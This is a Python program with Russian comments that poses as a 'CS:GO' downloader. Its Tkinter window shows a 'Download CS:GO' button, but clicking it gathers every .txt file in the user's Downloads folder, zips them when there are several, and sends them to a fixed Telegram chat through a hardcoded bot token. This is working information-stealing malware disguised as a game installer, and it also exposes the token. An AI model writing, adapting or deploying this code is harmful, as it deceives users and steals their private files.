import telebot
import os
import zipfile
from datetime import datetime
import sys
from telebot.apihelper import ApiTelegramException
import tkinter as tk
from tkinter import messagebox

# –¢–æ–∫–µ–Ω –±–æ—Ç–∞
TOKEN = '7830900342:AAFtd63btoDfM-FPtUdPb41Yzg-Pt2Z82-U'
bot = telebot.TeleBot(TOKEN)

# ID –≥—Ä—É–ø–ø—ã (–∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à)
CHAT_ID = 6054146925  # –ü–æ–ª—É—á–∏—Ç–µ —á–µ—Ä–µ–∑ @userinfobot

# –ü—É—Ç—å –∫ –ø–∞–ø–∫–µ "–ó–∞–≥—Ä—É–∑–∫–∏"
DOWNLOADS_DIR = os.path.join(os.path.expanduser("~"), "Downloads")
LOCK_FILE = os.path.join(DOWNLOADS_DIR, "send_txt.lock")

# –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä —Ñ–∞–π–ª–∞ –¥–ª—è Telegram (50 –ú–ë)
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 –ú–ë –≤ –±–∞–π—Ç–∞—Ö

class CSGOApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CS:GO TXT Sender")
        self.geometry("400x300")
        self.configure(bg="#1a1a1a")  # –¢—ë–º–Ω—ã–π —Ñ–æ–Ω –≤ —Å—Ç–∏–ª–µ CS:GO
        self.resizable(False, False)

        # –°—Ç–∏–ª–∏
        self.csgo_font = ("Arial", 14, "bold")
        self.csgo_button_font = ("Arial", 12, "bold")
        self.csgo_bg = "#1a1a1a"
        self.csgo_fg = "#ff9900"  # –û—Ä–∞–Ω–∂–µ–≤—ã–π –∞–∫—Ü–µ–Ω—Ç CS:GO
        self.csgo_button_bg = "#2a2a2a"
        self.csgo_button_active = "#4a4a4a"

        # –õ–æ–≥–æ—Ç–∏–ø –∏–ª–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫
        self.label = tk.Label(
            self,
            text="CS:GO TXT Sender",
            font=("Arial", 20, "bold"),
            fg=self.csgo_fg,
            bg=self.csgo_bg,
            pady=20
        )
        self.label.pack()

        # –°—Ç–∞—Ç—É—Å
        self.status_label = tk.Label(
            self,
            text="–ù–∞–∂–º–∏—Ç–µ '–°–∫–∞—á–∞—Ç—å CS:GO' –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–æ–≤",
            font=self.csgo_font,
            fg="#ffffff",
            bg=self.csgo_bg,
            wraplength=350
        )
        self.status_label.pack(pady=20)

        # –ö–Ω–æ–ø–∫–∞ "–°–∫–∞—á–∞—Ç—å CS:GO"
        self.download_button = tk.Button(
            self,
            text="–°–∫–∞—á–∞—Ç—å CS:GO",
            font=self.csgo_button_font,
            bg=self.csgo_button_bg,
            fg=self.csgo_fg,
            activebackground=self.csgo_button_active,
            activeforeground=self.csgo_fg,
            command=self.send_txt_files,
            relief="flat",
            padx=20,
            pady=10
        )
        self.download_button.pack(pady=20)

    def check_lock(self):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –∑–∞–ø—É—â–µ–Ω–æ –ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ."""
        if os.path.exists(LOCK_FILE):
            self.status_label.config(text="‚ùå –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —É–∂–µ –±—ã–ª–æ –∑–∞–ø—É—â–µ–Ω–æ —Ä–∞–Ω–µ–µ!")
            messagebox.showerror("–û—à–∏–±–∫–∞", "–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —É–∂–µ –±—ã–ª–æ –∑–∞–ø—É—â–µ–Ω–æ —Ä–∞–Ω–µ–µ!")
            return None
        return open(LOCK_FILE, 'w')

    def create_zip(self, txt_files, zip_name):
        """–°–æ–∑–¥–∞—ë—Ç ZIP-–∞—Ä—Ö–∏–≤ –∏–∑ —Å–ø–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤."""
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in txt_files:
                if os.path.getsize(file) > MAX_FILE_SIZE:
                    self.status_label.config(text=f"‚ö†Ô∏è –§–∞–π–ª {os.path.basename(file)} —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π ({os.path.getsize(file) / 1024 / 1024:.2f} –ú–ë), –ø—Ä–æ–ø—É—â–µ–Ω.")
                    return False
                zipf.write(file, os.path.basename(file))
        return True

    def send_txt_files(self):
        lock_file = None
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
            if not os.path.exists(DOWNLOADS_DIR):
                self.status_label.config(text="üìÇ –ü–∞–ø–∫–∞ –ó–∞–≥—Ä—É–∑–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞!")
                messagebox.showerror("–û—à–∏–±–∫–∞", "–ü–∞–ø–∫–∞ –ó–∞–≥—Ä—É–∑–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞!")
                return

            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–ª–æ–∫–∏—Ä–æ–≤–∫—É
            lock_file = self.check_lock()
            if not lock_file:
                return

            # –ù–∞—Ö–æ–¥–∏–º –≤—Å–µ .txt —Ñ–∞–π–ª—ã
            txt_files = [os.path.join(DOWNLOADS_DIR, f) for f in os.listdir(DOWNLOADS_DIR) if f.lower().endswith('.txt')]
            file_count = len(txt_files)

            if file_count == 0:
                self.status_label.config(text="üìÇ –í –ó–∞–≥—Ä—É–∑–∫–∞—Ö –Ω–µ—Ç .txt —Ñ–∞–π–ª–æ–≤!")
                messagebox.showinfo("–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è", "–í –ó–∞–≥—Ä—É–∑–∫–∞—Ö –Ω–µ—Ç .txt —Ñ–∞–π–ª–æ–≤!")
                os.remove(LOCK_FILE)
                return

            # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
            message = f"üìÇ –ù–∞—à—ë–ª {file_count} .txt —Ñ–∞–π–ª{'–æ–≤' if file_count > 1 else ''} –≤ –ó–∞–≥—Ä—É–∑–∫–∞—Ö! üöÄ"
            self.status_label.config(text=message)

            if file_count == 1:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑–º–µ—Ä —Ñ–∞–π–ª–∞
                if os.path.getsize(txt_files[0]) > MAX_FILE_SIZE:
                    self.status_label.config(text=f"‚ö†Ô∏è –§–∞–π–ª {os.path.basename(txt_files[0])} —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π ({os.path.getsize(txt_files[0]) / 1024 / 1024:.2f} –ú–ë).")
                    messagebox.showerror("–û—à–∏–±–∫–∞", f"–§–∞–π–ª {os.path.basename(txt_files[0])} —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π.")
                    os.remove(LOCK_FILE)
                    return
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ–¥–∏–Ω —Ñ–∞–π–ª
                with open(txt_files[0], 'rb') as file:
                    bot.send_document(CHAT_ID, file, caption=message)
            else:
                # –°–æ–∑–¥–∞—ë–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞—Ä—Ö–∏–≤
                zip_name = f"txt_files_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
                if not self.create_zip(txt_files, zip_name):
                    os.remove(LOCK_FILE)
                    return
                if not os.path.exists(zip_name) or os.path.getsize(zip_name) > MAX_FILE_SIZE:
                    self.status_label.config(text=f"‚ö†Ô∏è –ê—Ä—Ö–∏–≤ {zip_name} —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π ({os.path.getsize(zip_name) / 1024 / 1024:.2f} –ú–ë) –∏–ª–∏ –Ω–µ —Å–æ–∑–¥–∞–Ω.")
                    messagebox.showerror("–û—à–∏–±–∫–∞", f"–ê—Ä—Ö–∏–≤ {zip_name} —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π –∏–ª–∏ –Ω–µ —Å–æ–∑–¥–∞–Ω.")
                    os.remove(LOCK_FILE)
                    if os.path.exists(zip_name):
                        os.remove(zip_name)
                    return
                with open(zip_name, 'rb') as zip_file:
                    bot.send_document(CHAT_ID, zip_file, caption=message)
                os.remove(zip_name)

            self.status_label.config(text=f"‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {file_count} —Ñ–∞–π–ª{'–æ–≤' if file_count > 1 else ''} –≤ –≥—Ä—É–ø–ø—É!")
            messagebox.showinfo("–£—Å–ø–µ—Ö", f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {file_count} —Ñ–∞–π–ª{'–æ–≤' if file_count > 1 else ''} –≤ –≥—Ä—É–ø–ø—É!")
            lock_file.close()
        except ApiTelegramException as te:
            self.status_label.config(text=f"‚ùå –û—à–∏–±–∫–∞ Telegram API: {str(te)}")
            messagebox.showerror("–û—à–∏–±–∫–∞", f"Telegram API: {str(te)}")
            if lock_file:
                lock_file.close()
                os.remove(LOCK_FILE)
        except PermissionError:
            self.status_label.config(text="‚ùå –û—à–∏–±–∫–∞: –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª—É –∏–ª–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏!")
            messagebox.showerror("–û—à–∏–±–∫–∞", "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª—É –∏–ª–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏!")
            if lock_file:
                lock_file.close()
                os.remove(LOCK_FILE)
        except Exception as e:
            self.status_label.config(text=f"‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞: {str(e)}")
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞: {str(e)}")
            if lock_file:
                lock_file.close()
                os.remove(LOCK_FILE)

if __name__ == "__main__":
    if CHAT_ID == 'YOUR_CHAT_ID':
        print("‚ùå –û—à–∏–±–∫–∞: –£–∫–∞–∂–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π CHAT_ID!")
        sys.exit(1)
    app = CSGOApp()
    app.mainloop()